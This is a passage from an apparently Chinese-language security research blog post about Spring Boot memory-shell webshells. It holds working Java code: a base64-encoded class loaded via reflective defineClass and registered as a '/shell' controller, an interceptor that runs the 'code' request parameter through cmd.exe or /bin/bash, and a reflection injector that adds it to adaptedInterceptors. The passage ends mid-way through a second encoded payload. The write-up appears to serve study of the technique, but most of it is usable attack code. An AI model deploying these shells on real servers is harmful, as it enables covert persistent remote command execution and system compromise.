class="hljs-string">&quot;yv66vgAAADQAhQoAIQBBCABCCwBDAEQLAEUARggARwgASAoASQBKCgAMAEsIAEwKAAwATQcATgcATwgAUAgAUQoACwBSCABTCABUBwBVCgALAFYKAFcAWAoAEgBZCABaCgASAFsKABIAXAoAEgBdCgASAF4KAF8AYAoAXwBhCgBfAF4LAEUAYgcAYwcAZAcAZQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA7TG9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcjsBAAR0ZXN0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcATwcAZgcATgcAVQcAYwEAEE1ldGhvZFBhcmFtZXRlcnMBAApTb3VyY2VGaWxlAQATVGVzdENvbnRyb2xsZXIuamF2YQwAIgAjAQAEY29kZQcAZwwAaABpBwBqDABrAGwBAAABAAdvcy5uYW1lBwBtDABuAGkMAG8AcAEAA3dpbgwAcQByAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAIgBzAQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAHQAdQcAdgwAdwB4DAAiAHkBAAJcQQwAegB7DAB8AH0MAH4AcAwAfwAjBwBmDACAAIEMAIIAIwwAgwCEAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAOW9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcgEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAJc2VuZEVycm9yAQAEKEkpVgAhACAAIQAAAAAAAgABACIAIwABACQAAAAvAAEAAQAAAAUqtwABsQAAAAIAJQAAAAYAAQAAAA0AJgAAAAwAAQAAAAUAJwAoAAAAAQApACoAAgAkAAABqAAGAAgAAACzKxICuQADAgBOLLkABAEAOgQtxgCTEgU6BRIGuAAHtgAIEgm2AAqZACG7AAtZBr0ADFkDEg1TWQQSDlNZBS1TtwAPOganAB67AAtZBr0ADFkDEhBTWQQSEVNZBS1TtwAPOga7ABJZGQa2ABO2ABS3ABUSFrYAFzoHGQe2ABiZAAsZB7YAGacABRkFOgUZB7YAGhkEGQW2ABsZBLYAHBkEtgAdpwAMLBEBlLkAHgIApwAETrEAAQAAAK4AsQAfAAMAJQAAAEoAEgAAABAACQARABEAEgAVABMAGQAVACkAFgBHABgAYgAbAHgAHACMAB0AkQAeAJgAHwCdACAAogAhAKUAIgCuACYAsQAkALIAJwAmAAAAXAAJAEQAAwArACwABgAZAIkALQAuAAUAYgBAACsALAAGAHgAKgAvADAABwAJAKUAMQAuAAMAEQCdADIAMwAEAAAAswAnACgAAAAAALMANAA1AAEAAACzADYANwACADgAAAApAAj+AEcHADkHADoHADn8ABoHADv8ACUHADxBBwA5+AAa+QAIQgcAPQAAPgAAAAkCADQAAAA2AAAAAQA/AAAAAgBA&quot;</span>;<br>        <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>        m.setAccessible(<span class="hljs-literal">true</span>);<br>        Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>        Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br>        System.out.println(<span class="hljs-string">&quot;Instance created: &quot;</span> + instance);<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mm</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethods()[<span class="hljs-number">0</span>];<br>        rs.registerMapping(info, instance, mm);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Inject Successful!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="interceptor内存马"><a href="#Interceptor内存马" class="headerlink" title="Interceptor内存马"></a>Interceptor内存马</h1><p>Interceptor是springMvc的组件，所以他只作用于Spring MVC的请求处理流程，只处理通过Spring MVC的请求</p><p>所以他和其他组件也是有区别的：</p><p><code>Filter</code>和<code>Listener</code>在Servlet容器中配置，通常在<code>web.xml</code>文件中或通过注解配置。</p><p><code>Interceptor</code>在Spring MVC中配置，通常在Spring的配置文件或配置类中。</p><ul><li><strong>执行顺序</strong>：<ul><li><code>Filter</code>在<code>Interceptor</code>之前执行，因为<code>Filter</code>在请求到达Servlet之前就已经执行。</li><li><code>Interceptor</code>在<code>Filter</code>之后、Controller之前执行。</li><li><code>Listener</code>在应用启动、关闭、会话创建、销毁时执行，与请求处理流程无关。</li></ul></li></ul><p>y4师傅的文章中总结的请求到达Controller的顺序：</p><p>HttpRequest –&gt; Filter –&gt; DispactherServlet –&gt; Interceptor –&gt; Aspect –&gt; Controller</p><h2 id="interceptor编写"><a href="#Interceptor编写" class="headerlink" title="Interceptor编写"></a>Interceptor编写</h2><p>先编写一个简单的interceptor，和上面的controller一样可以执行命令的</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.interceptor;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>        <span class="hljs-keyword">if</span>(code != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                java.io.<span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span>(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>))&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, code&#125;);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, code&#125;);<br>                &#125;<br>                p.redirectErrorStream(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> p.start();<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                StringBuilder results=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>                <span class="hljs-keyword">while</span>((result=r.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>                    results.append(result+<span class="hljs-string">&quot;\r\n&quot;</span>);<br>                &#125;<br>                System.out.println(results);<br>                writer.println(results);<br>                writer.flush();<br>                writer.close();<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.postHandle(request, response, handler, modelAndView);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.afterCompletion(request, response, handler, ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后再进行添加注册</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.configure;<br><br><br><span class="hljs-keyword">import</span> org.clown.springbootmemoryshell.interceptor.TestInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterceptorConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> &#123;<br>        registry.addInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestInterceptor</span>()).addPathPatterns(<span class="hljs-string">&quot;/hello&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241113202533221.png" alt="image-20241113202533221"></p><h2 id="interceptor流程"><a href="#Interceptor流程" class="headerlink" title="Interceptor流程"></a>Interceptor流程</h2><p>emmm我本身打算配置类处打个断点分析interceptor的注册流程，但是看文章都是从处理请求的流程来分析的，估计是如果要动态注册的话我们应该是走不到配置类的手动addInterceptor的地方吗🤔</p><p>先按着网上的思路来吧，这个点到时有空的话研究一下🫡</p><p>那就直接在preHandle下个断点</p><p><img src="https://cdn.clown2024.cn/image-20241113213033793.png" alt="image-20241113213033793"></p><p>然后看看调用栈，其中在DispatcherServlet#doDispatch方法里面看到了处理我们PreHandle方法的地方</p><p><img src="https://cdn.clown2024.cn/image-20241113213305476.png" alt="image-20241113213305476"></p><p>这个applyPreHandle方法很明显就是处理我们PreHandle的方法，从返回值也可以推出，因为我们PreHandle返回的也是布尔值</p><p>从图中的变量值可以看到我们的interceptor就在这个mappedHandler变量当中</p><p><img src="https://cdn.clown2024.cn/image-20241113213755407.png" alt="image-20241113213755407"></p><p>那就看看这个mappedHandler是怎么生成的</p><p><img src="https://cdn.clown2024.cn/image-20241113213924826.png" alt="image-20241113213924826"></p><p>在doDispatch方法前面有一个getHandler方法，然后传入一个RequestFacade实例processedRequest，这个processedRequest是前面checkMultipart方法检查一下，该方法主要判断request是否为文件上传请求，不是的话则会原样返回</p><p>跟进去getHandler</p><p><img src="https://cdn.clown2024.cn/image-20241113214501797.png" alt="image-20241113214501797"></p><p>然后就是遍历每一个HandlerMapping，然后从中取得HandlerExecutionChain实例，如果能找到请求对应的Handler就返回，继续跟进，调用了AbstractHandlerMapping#getHandler方法</p><p><img src="https://cdn.clown2024.cn/image-20241113215756803.png" alt="image-20241113215756803"></p><p>这里首先获得一个handler，然后调用getHandlerExecutionChain返回了一个HandlerExecutionChain实例executionChain，看看这个方法</p><p><img src="https://cdn.clown2024.cn/image-20241113215627045.png" alt="image-20241113215627045"></p><p>里面显示new了一个HandlerExecutionChain，然后遍历adaptedInterceptors里的interceptor添加进去他的interceptorList里面</p><p><img src="https://cdn.clown2024.cn/image-20241113215958004.png" alt="image-20241113215958004"></p><p>interceptor有如下的这三种</p><p><img src="https://cdn.clown2024.cn/image-20241113220049185.png" alt="image-20241113220049185"></p><p>再往下他就直接返回了这个executionChain</p><p><img src="https://cdn.clown2024.cn/image-20241113220218053.png" alt="image-20241113220218053"></p><p>然后返回的handler也是这个</p><p><img src="https://cdn.clown2024.cn/image-20241113220259687.png" alt="image-20241113220259687"></p><p>然后最终执行就是我们前面说的那个applyPreHandle方法</p><p><img src="https://cdn.clown2024.cn/image-20241113220624107.png" alt="image-20241113220624107"></p><p>里面遍历了每个interprector然后进行调用</p><p>那现在我们就知道应该在哪里插入我们的interceptor了</p><h2 id="内存马实现"><a href="#内存马实现-1" class="headerlink" title="内存马实现"></a>内存马实现</h2><p>根据前面的分析所有的interceptor是存在adaptedInterceptors里面，这个属性在org.springframework.web.servlet.handler.AbstractHandlerMapping里面</p><p><img src="https://cdn.clown2024.cn/image-20241113221751279.png" alt="image-20241113221751279"></p><p>所以思路就是反射获取到这个变量，然后添加我们自己的恶意interceptor即可</p><p>编写的interceptor还是用我们一开始的那个TestInterceptor，现在先不把他加入配置，我们等会手动加入</p><p>然后编写内存马代码的步骤</p><ul><li>首先获取应用的上下文环境，也就是<code>ApplicationContext</code></li><li>然后从 <code>ApplicationContext</code> 中获取 <code>AbstractHandlerMapping</code> 实例（用于反射），也有文章直接获取RequestMappingHandlerMapping也可以，下面写的就是用的这个</li><li>反射获取 <code>AbstractHandlerMapping</code>类的 <code>adaptedInterceptors</code>字段</li><li>通过 <code>adaptedInterceptors</code>注册拦截器</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.clown.springbootmemoryshell.interceptor.TestInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddInterceptor</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/interceptor&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">addInterceptor</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">//        AbstractHandlerMapping mappingHandlerMapping = context.getBean(AbstractHandlerMapping.class);</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">TestInterceptor</span> <span class="hljs-variable">evilInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestInterceptor</span>();<br>        adaptInterceptors.add(evilInterceptor);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Interceptor added!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们访问interceptor这个路由就会成功注册我们的interceptor</p><p><img src="https://cdn.clown2024.cn/image-20241113224259546.png" alt="image-20241113224259546"></p><p><img src="https://cdn.clown2024.cn/image-20241113224312450.png" alt="image-20241113224312450"></p><p>这里的实现也可以改一下，改成前面Controller的base64的形式，这样就不需要服务器有对应的类了</p><p>修改后的exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddInterceptor</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/interceptor&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">addInterceptor</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><span class="hljs-comment">//        AbstractHandlerMapping mappingHandlerMapping = context.getBean(AbstractHandlerMapping.class);</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQArAoAKABeCABFCwBfAGALAGEAYggAYwoAZABlCgALAGYIAGcKAAsAaAcAaQcAaggAawgAbAoACgBtCABuCABvCgAKAHAKAAoAcQcAcgcAcwoAdAB1CgAUAHYKABMAdwgAeAcAeQoAGQBeCgATAHoKABkAewgAfAoAGQB9CQBkAH4KAH8AgAoAgQCACgCBAIIKAIEAgwcAhAsAKQCFCwApAIYHAIcHAIgHAIkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAPUxvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcjsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAFyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAHcmVzdWx0cwEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABGNvZGUBAA1TdGFja01hcFRhYmxlBwBqBwCKBwBpBwCHBwCLBwCMBwCIBwCNBwByBwB5BwCEAQAKRXhjZXB0aW9ucwEAEE1ldGhvZFBhcmFtZXRlcnMBAApwb3N0SGFuZGxlAQCSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7KVYBAAxtb2RlbEFuZFZpZXcBAC5Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7AQAPYWZ0ZXJDb21wbGV0aW9uAQB5KExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL0V4Y2VwdGlvbjspVgEAAmV4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAKU291cmNlRmlsZQEAFFRlc3RJbnRlcmNlcHRvci5qYXZhDAAqACsHAIsMAI4AjwcAjAwAkACRAQAHb3MubmFtZQcAkgwAkwCPDACUAJUBAAN3aW4MAJYAlwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACoAmAEACS9iaW4vYmFzaAEAAi1jDACZAJoMAJsAnAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwCNDACdAJ4MACoAnwwAKgCgAQAAAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAKEAlQwAogCjAQACDQoMAKQAlQwApQCmBwCnDACoAKkHAIoMAKoAKwwAqwArAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAVABVDABYAFkBADtvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcgEAEGphdmEvbGFuZy9PYmplY3QBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABFqYXZhL2xhbmcvUHJvY2VzcwEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABBqY